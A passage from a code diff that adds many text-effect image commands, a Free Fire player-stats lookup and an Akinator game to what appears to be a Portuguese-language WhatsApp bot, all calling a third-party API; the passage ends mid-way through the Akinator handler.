+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🟪 *EPHOTO PIXEL GLITCH*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Pixel Glitch.");
+}
+
+}
+break;
+
+case 'neonlight':
+case 'ephotoneonlight': {
+try {
+
+if (!q) return reply(`💡 *EPHOTO NEON LIGHT*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "💡");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/neonlight?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`💡 *EPHOTO NEON LIGHT*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Neon Light.");
+}
+
+}
+break;
+
+case 'frozenchristmas':
+case 'frozen-christmas':
+case 'ephotofrozenchristmas': {
+try {
+
+if (!q) return reply(`❄️ *EPHOTO FROZEN CHRISTMAS*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "❄️");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/frozen-christmas?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`❄️ *EPHOTO FROZEN CHRISTMAS*
+
+✏️ Texto: ${q}`,
+
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Frozen Christmas.");
+}
+
+}
+break;
+
+case 'foggyglass':
+case 'ephotofoggyglass': {
+try {
+
+if (!q) return reply(`🌫️ *EPHOTO FOGGY GLASS*
+
+Use:
+${prefix + command} modo|texto
+
+*Modos disponíveis:*
+• bear
+• cat
+• flower
+• heart
+• sad
+• smile
+
+Exemplo:
+${prefix + command} heart|Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "🌫️");
+
+let [modo, texto] = q.split("|");
+
+if (!modo || !texto)
+return reply("❌ Use o formato:\nModo|Texto");
+
+modo = modo.toLowerCase();
+
+const modos = [
+"bear",
+"cat",
+"flower",
+"heart",
+"sad",
+"smile"
+];
+
+if (!modos.includes(modo))
+return reply(`❌ Modo inválido!
+
+Modos disponíveis:
+• bear
+• cat
+• flower
+• heart
+• sad
+• smile`);
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/foggyglass?apikey=API_KEY_SYSTEM&mode=${modo}&text=${encodeURIComponent(texto)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🌫️ *EPHOTO FOGGY GLASS*
+
+🎭 Modo: ${modo.charAt(0).toUpperCase() + modo.slice(1)}
+✏️ Texto: ${texto}}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Foggy Glass.");
+}
+
+}
+break;
+
+case 'dragonball':
+case 'ephotodragonball': {
+try {
+
+if (!q) return reply(`🐉 *EPHOTO DRAGON BALL*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "🐉");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/dragonball?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🐉 *EPHOTO DRAGON BALL*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Dragon Ball.");
+}
+
+}
+break;
+
+case 'deadpool':
+case 'ephotodeadpool': {
+try {
+
+if (!q || !q.includes('|')) return reply(`🔴 *EPHOTO DEADPOOL*
+
+Use:
+${prefix + command} texto1|texto2
+
+Exemplo:
+${prefix + command} Gzee|Scripts`);
+
+const axios = require("axios");
+
+const [text1, text2] = q.split('|').map(v => v.trim());
+
+await reagir(from, "🔴");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/deadpool?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from, {
+image: {
+url: data.imagem
+},
+caption: `🔴 *EPHOTO DEADPOOL*
+
+✏️ Texto 1: ${text1}
+✏️ Texto 2: ${text2}`
+}, {
+quoted: info
+});
+
+} catch (e) {
+console.log(e);
+reply("❌ Erro ao criar Deadpool.");
+}
+}
+break;
+
+case 'comic3d':
+case 'ephotocomic3d': {
+try {
+
+if (!q) return reply(`📖 *EPHOTO COMIC 3D*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "📖");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/comic3d?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`📖 *EPHOTO COMIC 3D*
+
+✏️ Texto: ${q}`,
+
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Comic 3D.");
+}
+
+}
+break;
+
+case 'colorful':
+case 'ephotocolorful': {
+try {
+
+if (!q) return reply(`🌈 *EPHOTO COLORFUL*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "🌈");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/colorful?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar vídeo.");
+
+await conn.sendMessage(from,{
+video:{
+url:data.imagem
+},
+caption:
+`🌈 *EPHOTO COLORFUL*
+
+✏️ Texto: ${q}`,
+gifPlayback:false,
+buttons:[
+{
+buttonId:`${prefix}colorful ${q}`,
+buttonText:{
+displayText:"🔄 Refazer"
+},
+type:1
+},
+{
+buttonId:`${prefix}menu`,
+buttonText:{
+displayText:"📋 Menu"
+},
+type:1
+}
+],
+headerType:5
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Colorful.");
+}
+
+}
+break;
+
+case 'lovecart':
+case 'ephotolovecart': {
+try {
+
+if (!q) return reply(`💖 *EPHOTO LOVE CART*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "💖");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/lovecart?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar vídeo.");
+
+await conn.sendMessage(from,{
+video:{
+url:data.imagem
+},
+caption:
+`💖 *EPHOTO LOVE CART*
+
+✏️ Texto: ${q}`,
+gifPlayback: false,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Love Cart.");
+}
+
+}
+break;
+
+case 'captainamerica':
+case 'ephotocaptainamerica': {
+try {
+
+if (!q) return reply(`🛡️ *EPHOTO CAPTAIN AMERICA*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "🛡️");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/captainamerica?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🛡️ *EPHOTO CAPTAIN AMERICA*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Captain America.");
+}
+
+}
+break;
+
+case 'bornpink':
+case 'ephotobornpink': {
+try {
+
+if (!q) return reply(`💗 *EPHOTO BORN PINK*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "💗");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/bornpink?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`💗 *EPHOTO BORN PINK*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Born Pink.");
+}
+
+}
+break;
+
+case 'blackpink':
+case 'ephotoblackpink': {
+try {
+
+if (!q) return reply(`🖤💗 *EPHOTO BLACKPINK*
+
+Use:
+${prefix + command} modo|texto
+
+*Modos disponíveis:*
+• jennie
+• jisoo
+• lisa
+• rose
+
+Exemplo:
+${prefix + command} lisa|Gzee`);
+
+const axios = require("axios");
+
+await reagir(from, "🖤");
+
+let [modo, texto] = q.split("|");
+
+if (!modo || !texto)
+return reply("❌ Use o formato:\nModo|Texto");
+
+modo = modo.toLowerCase();
+
+const modos = ["jennie", "jisoo", "lisa", "rose"];
+
+if (!modos.includes(modo))
+return reply(`❌ Modo inválido!
+
+Modos:
+• jennie
+• jisoo
+• lisa
+• rose`);
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/blackpink?apikey=API_KEY_SYSTEM&mode=${modo}&text=${encodeURIComponent(texto)}`
+);
+
+if (!data.status)
+return reply("❌ Erro ao gerar imagem.");
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🖤💗 *EPHOTO BLACKPINK*
+
+👤 Membro: ${modo.charAt(0).toUpperCase() + modo.slice(1)}
+✏️ Texto: ${texto}}`,
+},{
+quoted:info
+});
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar imagem Blackpink.");
+}
+
+}
+break;
+
+case 'balloon':
+case 'ephotoballoon': {
+try {
+
+if(!q) return reply(`🎈 *EPHOTO BALLOON*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🎈");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ephoto/balloon?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🎈 *EPHOTO BALLOON*
+
+✏️ Texto: ${q}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Balloon.");
+}
+
+}
+break;
+
+case 'tiktokphoto':
+case 'photooxytiktok': {
+try {
+
+if(!q) return reply(`🎵 *PHOTO OXY TIKTOK*
+
+Use:
+${prefix + command} texto grande|texto pequeno
+
+Exemplo:
+${prefix + command} Gzee|Scripts`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🎵");
+
+
+let [large, small] = q.split("|");
+
+if(!large || !small) {
+return reply("❌ Use o formato:\nTexto grande|Texto pequeno");
+}
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/tiktok?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(large)}&text2=${encodeURIComponent(small)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🎵 *PHOTO OXY TIKTOK*
+
+🔰 Texto principal: ${data.texts.large}
+🔹 Texto secundário: ${data.texts.small}}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar TikTok.");
+}
+
+}
+break;
+
+case 'metalictext':
+case 'photooxymetalic': {
+try {
+
+if(!q) return reply(`⚙️ *PHOTO OXY METALIC TEXT*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} GZEE`);
+
+
+const axios = require("axios");
+
+await reagir(from,"⚙️");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/metalictext?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`⚙️ *PHOTO OXY METALIC TEXT*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Metalic Text.");
+}
+
+}
+break;
+
+case 'starstext':
+case 'photooxystars': {
+try {
+
+if(!q) return reply(`⭐ *PHOTO OXY STARS TEXT*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+
+const axios = require("axios");
+
+await reagir(from,"⭐");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/starstext?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`⭐ *PHOTO OXY STARS TEXT*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Stars Text.");
+}
+
+}
+break;
+
+case 'textsmoke':
+case 'photooxytextsmoke': {
+try {
+
+if(!q) return reply(`💨 *PHOTO OXY TEXT SMOKE*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} CS GO`);
+
+
+const axios = require("axios");
+
+await reagir(from,"💨");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/textsmoke?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`💨 *PHOTO OXY TEXT SMOKE*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Text Smoke.");
+}
+
+}
+break;
+
+case 'rainbowtext':
+case 'photooxyrainbow': {
+try {
+
+if(!q) return reply(`🌈 *PHOTO OXY RAINBOW TEXT*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🌈");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/rainbowtext?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🌈 *PHOTO OXY RAINBOW TEXT*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Rainbow Text.");
+}
+
+}
+break;
+
+case 'pubg':
+case 'photooxypubg': {
+try {
+
+if(!q) return reply(`🎮 *PHOTO OXY PUBG*
+
+Use:
+${prefix + command} texto grande|texto pequeno
+
+Exemplo:
+${prefix + command} Gzee|Dev`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🎮");
+
+
+let [large, small] = q.split("|");
+
+if(!large || !small) {
+return reply("❌ Use o formato:\nTexto grande|Texto pequeno");
+}
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/pubg?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(large)}&text2=${encodeURIComponent(small)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🎮 *PHOTO OXY PUBG*
+
+🔰 Texto principal: ${data.texts.large}
+🔹 Texto secundário: ${data.texts.small}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar PUBG.");
+}
+
+}
+break;
+
+case 'neonmetalic':
+case 'photooxyneonmetalic': {
+try {
+
+if(!q) return reply(`⚡ *PHOTO OXY NEON METALIC*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+
+const axios = require("axios");
+
+await reagir(from,"⚡");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/neonmetalic?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`⚡ *PHOTO OXY NEON METALIC*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Neon Metalic.");
+}
+
+}
+break;
+
+case 'neonglow':
+case 'photooxyneonglow': {
+try {
+
+if(!q) return reply(`✨ *PHOTO OXY NEON GLOW*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} GZEE`);
+
+
+const axios = require("axios");
+
+await reagir(from,"✨");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/neonglow?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`✨ *PHOTO OXY NEON GLOW*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Neon Glow.");
+}
+
+}
+break;
+
+case 'neonparty':
+case 'photooxyneon': {
+try {
+
+if(!q) return reply(`🎉 *PHOTO OXY NEON PARTY*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🎉");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/neonparty?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🎉 *PHOTO OXY NEON PARTY*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Neon Party.");
+}
+
+}
+break;
+
+case 'naruto':
+case 'photooxynaruto': {
+try {
+
+if(!q) return reply(`🍥 *PHOTO OXY NARUTO*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} GZEEDEV`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🍥");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/naruto?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🍥 *PHOTO OXY NARUTO*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Naruto.");
+}
+
+}
+break;
+
+case 'harrypotter':
+case 'photooxyharry': {
+try {
+
+if(!q) return reply(`🪄 *PHOTO OXY HARRY POTTER*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} GZEE`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🪄");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/harrypotter?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🪄 *PHOTO OXY HARRY POTTER*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Harry Potter.");
+}
+
+}
+break;
+
+case 'graffiticover':
+case 'photooxygraffiti': {
+try {
+
+if(!q) return reply(`🎨 *PHOTO OXY GRAFFITI COVER*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🎨");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/graffiticover?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🎨 *PHOTO OXY GRAFFITI COVER*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Graffiti Cover.");
+}
+
+}
+break;
+
+case 'flamingtext':
+case 'photooxyflaming': {
+try {
+
+if(!q) return reply(`🔥 *PHOTO OXY FLAMING TEXT*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gzee`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🔥");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/flamingtext?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🔥 *PHOTO OXY FLAMING TEXT*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar Flaming Text.");
+}
+
+}
+break;
+
+case 'cemetery':
+case 'photooxycemetery': {
+try {
+
+if(!q) return reply(`⚰️ *PHOTO OXY CEMETERY*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} Gabs morreu`);
+
+
+const axios = require("axios");
+
+await reagir(from,"⚰️");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/cemetery?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`⚰️ *PHOTO OXY CEMETERY*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar imagem Cemetery.");
+}
+
+}
+break;
+
+case 'butterfly':
+case 'photooxybutterfly': {
+try {
+
+if(!q) return reply(`🦋 *PHOTO OXY BUTTERFLY*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} GZEE`);
+
+
+const axios = require("axios");
+
+await reagir(from,"🦋");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/butterfly?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(q)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao gerar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`🦋 *PHOTO OXY BUTTERFLY*
+
+✏️ Texto: ${data.text}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao criar imagem Butterfly.");
+}
+
+}
+break;
+
+case 'battlefield': {
+try {
+
+if(!q) return reply(`⚔️ *PHOTO OXY BATTLEFIELD*
+
+Use:
+${prefix}photooxy texto grande|texto pequeno
+
+Exemplo:
+${prefix}photooxy Gzee|Dev`);
+
+
+const axios = require("axios");
+
+await reagir(from,"⚔️");
+
+
+let [texto1, texto2] = q.split("|");
+
+if(!texto1 || !texto2) {
+return reply("❌ Use o formato:\nTexto grande|Texto pequeno");
+}
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/photooxy/battlefield?apikey=API_KEY_SYSTEM&text1=${encodeURIComponent(texto1)}&text2=${encodeURIComponent(texto2)}`
+);
+
+
+if(!data.status) return reply("❌ Erro ao criar imagem.");
+
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagem
+},
+caption:
+`⚔️ *PHOTO OXY BATTLEFIELD*
+
+🔰 Texto: ${data.texts.large}
+🔹 Subtexto: ${data.texts.small}`,
+},{
+quoted:info
+});
+
+
+}catch(e){
+console.log(e);
+reply("❌ Erro ao gerar imagem.");
+}
+
+}
+break;
+
+case 'ffstalk': {
+try {
+
+if(!q) return reply(`🔥 *ZYRON STALK*
+
+Use:
+${prefix}ffstalk ID
+
+Exemplo:
+${prefix}ffstalk 1809155897`);
+
+await reagir(from,"🔥");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/ffstalkv2?apikey=API_KEY_SYSTEM&id=${q}`
+);
+
+
+if(!data.status) return reply("❌ Jogador não encontrado.");
+
+
+let texto = `
+🔥 *FREE FIRE STALK*
+
+👤 *Nick:* ${data.nickname || "Não encontrado"}
+🆔 *UID:* ${data.uid || q}
+
+⭐ *Level:* ${data.level || "0"}
+🌎 *Região:* ${data.region || "N/A"}
+✨ *XP:* ${data.xp || "0"}
+
+❤️ *Likes:* ${data.likes || "0"}
+
+🏰 *Guilda:* ${data.guilda || "Sem guilda"}
+
+🎟️ *Passe Booyah:* ${data.passe_booyah || "N/A"}
+
+📝 *Bio:*
+${data.bio || "Sem bio"}
+
+
+📅 *Conta criada:*
+${data.account_created || "N/A"}
+
+🕐 *Último login:*
+${data.last_login || "N/A"}
+
+
+🎮 *ESTATÍSTICAS*
+
+⚔️ *Partidas*
+Solo: ${data.stats_gerais?.partidas?.solo || 0}
+Duo: ${data.stats_gerais?.partidas?.duo || 0}
+Squad: ${data.stats_gerais?.partidas?.squad || 0}
+
+🏆 *Vitórias*
+Solo: ${data.stats_gerais?.vitorias?.solo || 0}
+Duo: ${data.stats_gerais?.vitorias?.duo || 0}
+Squad: ${data.stats_gerais?.vitorias?.squad || 0}
+
+💀 *K/D*
+Solo: ${data.stats_gerais?.kd?.solo || 0}
+Duo: ${data.stats_gerais?.kd?.duo || 0}
+Squad: ${data.stats_gerais?.kd?.squad || 0}
+
+🎯 *Taxa HS*
+Solo: ${data.stats_gerais?.taxa_hs?.solo || 0}%
+Duo: ${data.stats_gerais?.taxa_hs?.duo || 0}%
+Squad: ${data.stats_gerais?.taxa_hs?.squad || 0}%
+`;
+
+
+if(data.imagens?.avatar){
+
+await conn.sendMessage(from,{
+image:{
+url:data.imagens.avatar
+},
+caption:texto
+},{
+quoted:info
+});
+
+} else {
+
+await conn.sendMessage(from,{
+text:texto
+},{
+quoted:info
+});
+
+}
+
+
+}catch(e){
+console.log("ERRO FFSTALK:", e.response?.data || e);
+reply("❌ Erro ao consultar Free Fire.");
+}
+
+}
+break;
+
+case 'akinator':
+case 'aki': {
+try {
+
+const API = 'https://zone.api.br/api/akinator';
+const KEY = 'API_KEY_SYSTEM';
+
+const REACOES_AKI = [
+  'https://files.catbox.moe/ux822e.jpg',
+
+  'https://files.catbox.moe/48rnud.jpg',
+  
+  'https://files.catbox.moe/6adzva.jpg',
+
+  'https://files.catbox.moe/us142h.jpeg',
+
+  'https://files.catbox.moe/7g0cuo.jpg',
+
+  'https://files.catbox.moe/s3cjrl.jpg',
+];
+
+const getReacaoAki = () => 
+REACOES_AKI[Math.floor(Math.random() * REACOES_AKI.length)];
+
+const id = sender || m.sender;
+
+const call = (action, extra = {}) =>
+axios.get(API, {
+params:{
+apikey:KEY,
+action,
+id,
+...extra
+}
+}).then(r=>r.data);
+
+
+const enviarPergunta = async (estado)=>{
+
+if(!estado.pergunta){
+return reply(`🧞 Não consegui continuar. Use ${prefix}aki novamente.`);
+}
+
+
+let texto = `
+╭━━〔 🧞 AKINATOR 〕━━⬣
+
+❓ Pergunta ${estado.passo + 1}
+📊 Progresso: ${parseFloat(estado.progresso).toFixed(1)}%
+
+${estado.pergunta}
+
+💬 Responda pelos botões abaixo
+╰━━━━━━━━━━━━━━⬣`;
+
+
+let buttons=[
+{
+name:"quick_reply",
+buttonParamsJson:JSON.stringify({
+display_text:"✅ Sim",
+id:`${prefix}aki s`
+})
+},
+{
+name:"quick_reply",
+buttonParamsJson:JSON.stringify({
+display_text:"❌ Não",
+id:`${prefix}aki n`
+})
+},
+{
+name:"quick_reply",
+buttonParamsJson:JSON.stringify({
+display_text:"🤔 Não sei",
+id:`${prefix}aki nsei`
+})
+},
+{
+name:"quick_reply",
+buttonParamsJson:JSON.stringify({
+display_text:"🤔 Provavelmente sim",
+id:`${prefix}aki psim`
+})
+},
+{
+name:"quick_reply",
+buttonParamsJson:JSON.stringify({
+display_text:"🤷 Provavelmente não",
+id:`${prefix}aki pnao`
+})
+},
+{
+name:"quick_reply",
+buttonParamsJson:JSON.stringify({
+display_text:"↩️ Voltar",
+id:`${prefix}aki voltar`
+})
+}
+];
+
+
+let media;
+
+try{
+
+media = await prepareWAMessageMedia(
+{image:{url:getReacaoAki()}},
+{upload:conn.waUploadToServer}
+);
+
+}catch{}
+
+
+const msg = generateWAMessageFromContent(from,{
+interactiveMessage:{
+body:{text:texto},
+footer:{text:"🧞 Akinator"},
+header:{
+hasMediaAttachment:true,
+imageMessage:media?.imageMessage
+},
+nativeFlowMessage:{
+buttons
+}
+}
+},{
+userJid:conn.user.id,
